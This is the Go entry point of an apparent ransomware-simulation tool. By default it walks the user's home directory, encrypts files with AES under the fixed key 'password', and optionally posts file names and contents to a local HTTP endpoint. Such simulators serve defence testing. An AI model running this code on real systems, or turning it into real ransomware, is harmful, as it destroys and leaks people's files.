package main

import (
	"os"
	"time"

	"gitlab.com/mjwhitta/cli"
	"gitlab.com/mjwhitta/log"
	rw "gitlab.com/mjwhitta/ransimware"
)

// Exit status
const (
	Good = iota
	InvalidOption
	InvalidArgument
	MissingArguments
	ExtraArguments
	Exception
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			if flags.verbose {
				panic(r.(error).Error())
			}
			log.ErrX(Exception, r.(error).Error())
		}
	}()

	var e error
	var home string
	var paths []string
	var sim *rw.Simulator

	validate()

	// Get list of targets
	paths = cli.Args()
	if cli.NArg() == 0 {
		if home, e = os.UserHomeDir(); e != nil {
			panic(e)
		}

		paths = []string{home}
	}

	// Create simulator
	sim = rw.New(flags.threads)
	sim.WaitEvery = time.Duration(flags.waitEvery) * time.Second
	sim.WaitFor = time.Duration(flags.waitFor) * time.Second

	if flags.encrypt {
		sim.Encrypt = func(fn string, b []byte) ([]byte, error) {
			println(fn)
			return rw.AESEncrypt("password")(fn, b)
		}
	}

	if flags.exfil {
		sim.ExfilFilenames = true
		sim.ExfilThreshold = flags.threshold
		sim.Exfil = rw.HTTPExfil(
			"http://localhost:8080",
			map[string]string{},
		)
	}

	// Add targets
	for _, path := range paths {
		if e = sim.Target(path); e != nil {
			panic(e)
		}
	}

	// Start simulator
	if e = sim.Run(); e != nil {
		panic(e)
	}
}
